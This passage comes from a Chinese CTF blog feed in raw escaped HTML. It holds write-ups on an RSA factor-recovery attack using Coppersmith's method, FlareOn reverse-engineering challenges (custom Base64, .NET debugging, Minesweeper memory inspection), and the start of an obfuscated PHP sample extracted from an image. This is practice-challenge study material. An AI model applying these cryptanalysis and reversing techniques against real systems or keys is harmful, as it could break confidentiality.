N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe27e847b1cece6ad3d8a35c27022d94cc14016f9550d41b87b85f946edf0a1c01d8c79a663244143550cfce88038bf29d65070d021991455e4570ea57ea1effc1cf380d572473dc6ea0dc150c431761181e66c578eaeebf156c445d3b6141dda961aa467f4d2c811859534027e5b9e67eb4db051c82602208cfe92674013aafa5b437ae404876ececc2f453bb16734adccc5fb87b16e980e52484f6b9f4bdeb99f2e7dc606bb65628e3f62c7df11abd553ffc6b95d3dda592fa81df5e584687864de702d10669e3aac75ad9c6284b98b44140f347307243b2485f59fa5c3f0eaeaf0addade803f2f09cd4c77f27d672756b9cc62a6325247d8608390e761dc91&lt;/span&gt;
pbits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nbits()
kbits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
PR&lt;span style=&#34;color:#f92672&#34;&gt;.&amp;lt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PolynomialRing(Zmod(N))
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p
x0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;small_roots(X&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;kbits, beta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.4&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
print( &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;hex(int(x0)))
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;x0
print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p: &amp;#34;&lt;/span&gt;, hex(int(p)))
&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; N &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; N&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;int(p)
print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q: &amp;#34;&lt;/span&gt;, hex(int(q)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到 RSA 的 $P$ 和 $Q$，最终构建解密脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; invmod, n2s
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722fbcdcffc1a2ef&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfced19c7532be88658aaa5e9566f5274b9aefa4c5d21582a24cc48c70b5e3c05c17eb6f85b4732d57bdc0288d1f548b92f4f13a6f7b07d07a01173cefb06fb8f2e3591e5d518d1584a8e27331a4e769eae98537fe1fb380ee804574d98188a4c327c8a1d180ee44b9148d63a07216b40e711970c9f1ea097bfbecfc3b52e787f&lt;/span&gt;
phi_n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (q &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
print (n2s(c, invmod(e, phi_n), N))
&lt;span style=&#34;color:#75715e&#34;&gt;# flag{w0_x1hu1n_y0u_b5st}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUUOJ FlareOn Challenge</title>
        <link>/post/buuoj-flareon-challenge/</link>
        <pubDate>Fri, 09 Apr 2021 01:04:16 +0000</pubDate>
        
        <guid>/post/buuoj-flareon-challenge/</guid>
        <description>&lt;h2 id=&#34;chanllenge1&#34;&gt;Chanllenge1&lt;/h2&gt;
&lt;p&gt;一个修改了 table 的 Base64&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string

fake_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&amp;#39;&lt;/span&gt;
true_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_uppercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+/&amp;#39;&lt;/span&gt;

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&amp;#39;&lt;/span&gt;
good_cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
    good_cipher &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; true_base[fake_base&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(c)]

print (good_cipher)
print (base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(good_cipher))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;bob-doge&#34;&gt;Bob Doge&lt;/h2&gt;
&lt;p&gt;先运行测试一下，发现点击 &lt;code&gt;Decode&lt;/code&gt; 之后是乱码&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;dnSpy&lt;/code&gt; 打开，找到 &lt;code&gt;Main&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Main()
{
	Application.EnableVisualStyles();
	Application.SetCompatibleTextRenderingDefault(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);
	Application.Run(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Form1());
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现只新建了一个 &lt;code&gt;Form1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;Form1&lt;/code&gt;，找到带有 &lt;code&gt;Click&lt;/code&gt; 的函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; btnDecode_Click(&lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; sender, EventArgs e)
		{
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.pbRoge.Image = Resources.bob_roge;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] dat_secret = Resources.dat_secret;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; b &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; dat_secret)
			{
				text += (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)((b &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; | ((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)b &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;)) ^ &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;);
			}
			text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\0&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text2 = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &amp;lt; text.Length; j += &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
			{
				text2 += text[j + &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
				text2 += text[j];
			}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text3 = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; k &amp;lt; text2.Length; k++)
			{
				&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c = text2[k];
				text3 += (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;)text2[k] ^ &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;);
			}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lbl_title.Text = text3;
		}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现是从一个 &lt;code&gt;Resources&lt;/code&gt; 的地方调用来了一个 &lt;code&gt;dat_secret&lt;/code&gt;。但找不到这个地方。&lt;/p&gt;
&lt;p&gt;于是考虑进行动态调试。&lt;/p&gt;
&lt;p&gt;打上断点后调试，点击 &lt;code&gt;Decode&lt;/code&gt; 按钮，进入如下页面&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 163; 
			flex-basis: 392px&#34;
	&gt;
	&lt;a href=&#34;/post/buuoj-flareon-challenge/flag.png&#34; data-size=&#34;1517x928&#34;&gt;
		&lt;img src=&#34;/post/buuoj-flareon-challenge/flag.png&#34;
			width=&#34;1517&#34;
			height=&#34;928&#34;
			srcset=&#34;/post/buuoj-flareon-challenge/flag_huc64739e239ecfc7ce339206ac4f62beb_99532_480x0_resize_box_3.png 480w, /post/buuoj-flareon-challenge/flag_huc64739e239ecfc7ce339206ac4f62beb_99532_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;flag&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;flag&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一开始以为最后的 &lt;code&gt;text3&lt;/code&gt; 是 &lt;code&gt;flag&lt;/code&gt;，结果看到 &lt;code&gt;text&lt;/code&gt; 变量长得就很好看，符合 FlareOn 的 flag 的特征，于是直接提交试试，发现通过。&lt;/p&gt;
&lt;h2 id=&#34;ultimateminesweeper&#34;&gt;UltimateMinesweeper&lt;/h2&gt;
&lt;p&gt;运行软件测试一下，发现是一个 $30\times 30$ 的扫雷，只有三个格子不是雷。&lt;/p&gt;
&lt;p&gt;exeinfo发现是 &lt;code&gt;.NET&lt;/code&gt; 文件，因此拖到 &lt;code&gt;dnSpy&lt;/code&gt; 中&lt;/p&gt;
&lt;p&gt;由于是面向对象代码，不太好分析，所以进行动态调试，在生成完扫雷界面后停下，查看内存数据，发现在 &lt;code&gt;mineField.MinesPresent&lt;/code&gt; 中存有雷的位置。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 104; 
			flex-basis: 251px&#34;
	&gt;
	&lt;a href=&#34;/post/buuoj-flareon-challenge/mineinmemory.png&#34; data-size=&#34;797x760&#34;&gt;
		&lt;img src=&#34;/post/buuoj-flareon-challenge/mineinmemory.png&#34;
			width=&#34;797&#34;
			height=&#34;760&#34;
			srcset=&#34;/post/buuoj-flareon-challenge/mineinmemory_hu2204770b1ea74c100068febd9ccfeaa8_54661_480x0_resize_box_3.png 480w, /post/buuoj-flareon-challenge/mineinmemory_hu2204770b1ea74c100068febd9ccfeaa8_54661_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;mineinmemory&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;mineinmemory&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;先尝试直接手动把雷扔到前三个，然后运行试一下，发现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;二元数组是先竖后横&lt;/li&gt;
&lt;li&gt;最后出现的结果是乱码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此简单看一下最后的生成函数&lt;/p&gt;
&lt;p&gt;寻找 &lt;code&gt;SuccessPopup&lt;/code&gt; 的调用&lt;/p&gt;
&lt;p&gt;发现 &lt;code&gt;new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因此找到这个方法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; GetKey(List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt; revealedCells)
		{
			revealedCells.Sort();
			Random random = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Random(Convert.ToInt32(revealedCells[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; | revealedCells[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; | revealedCells[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]));
			&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
			&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array2 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[]
			{
				&lt;span style=&#34;color:#ae81ff&#34;&gt;245&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;142&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;185&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;231&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;129&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;254&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;243&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;179&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;195&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;215&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;154&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;231&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;241&lt;/span&gt;,
				&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;
			};
			random.NextBytes(array);
			&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt; num = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;U;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;)num &amp;lt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)array2.Length))
			{
				&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array3 = array2;
				&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt; num2 = num;
				array3[(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)num2] = (array3[(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)num2] ^ array[(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)num]);
				num += &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;U;
			}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Encoding.ASCII.GetString(array2);
		}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;似乎最后的结果和扫雷时点击的位置也有关系，所以不能手动修改雷的位置&lt;/p&gt;
&lt;p&gt;那就找到三个 &lt;code&gt;False&lt;/code&gt; 并记录下来即可&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;7 20
28 7
24 28
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行并点击这三个位置&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 80; 
			flex-basis: 193px&#34;
	&gt;
	&lt;a href=&#34;/post/buuoj-flareon-challenge/whereismine.png&#34; data-size=&#34;782x971&#34;&gt;
		&lt;img src=&#34;/post/buuoj-flareon-challenge/whereismine.png&#34;
			width=&#34;782&#34;
			height=&#34;971&#34;
			srcset=&#34;/post/buuoj-flareon-challenge/whereismine_hu694e5f3302c8cc764768ccfe492c305a_72554_480x0_resize_box_3.png 480w, /post/buuoj-flareon-challenge/whereismine_hu694e5f3302c8cc764768ccfe492c305a_72554_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;whereismine&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;whereismine&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后弹出 flag&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 146; 
			flex-basis: 352px&#34;
	&gt;
	&lt;a href=&#34;/post/buuoj-flareon-challenge/thisisflag.png&#34; data-size=&#34;1036x705&#34;&gt;
		&lt;img src=&#34;/post/buuoj-flareon-challenge/thisisflag.png&#34;
			width=&#34;1036&#34;
			height=&#34;705&#34;
			srcset=&#34;/post/buuoj-flareon-challenge/thisisflag_hu437ac80ace387d10f03b56c307da78cd_335281_480x0_resize_box_3.png 480w, /post/buuoj-flareon-challenge/thisisflag_hu437ac80ace387d10f03b56c307da78cd_335281_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;thisisflag&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;thisisflag&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;flareon1javascrap&#34;&gt;[FlareOn1]Javascrap&lt;/h2&gt;
&lt;p&gt;一开始盯着网页看了半天，找不到题目在哪儿，就看了眼别人的wp，发现文件就在图片里&lt;/p&gt;
&lt;p&gt;用010editor打开，找到php文件，导出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; 
	$terms&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;M&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Z&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;]&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Q&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;z&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;g&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;W&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;y&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;T&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;V&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;S&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;9&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;, 